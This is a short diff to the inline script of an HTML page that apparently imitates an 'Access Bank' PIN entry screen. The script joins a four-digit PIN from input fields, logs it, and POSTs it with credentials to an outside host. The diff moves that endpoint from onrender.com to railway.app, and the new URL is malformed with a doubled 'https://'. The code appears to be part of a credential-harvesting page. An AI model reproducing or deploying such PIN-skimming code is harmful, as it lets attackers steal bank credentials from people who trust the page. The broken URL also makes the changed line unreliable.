@@ -224,7 +224,7 @@ continueBtn.addEventListener("click", () => {
     pin:`${inputs[0].value}${inputs[1].value}${inputs[2].value}${inputs[3].value}`
   }
          console.log(send_data)
-    fetch('https://access-bank.onrender.com/sendreq',{
+    fetch('https://https://access-bank-production.up.railway.app/sendreq',{
     method: 'POST',
                 credentials:'include',
                headers: {
@@ -255,4 +255,5 @@ continueBtn.addEventListener("click", () => {
   </script>
 </body>
 </html>
+
 
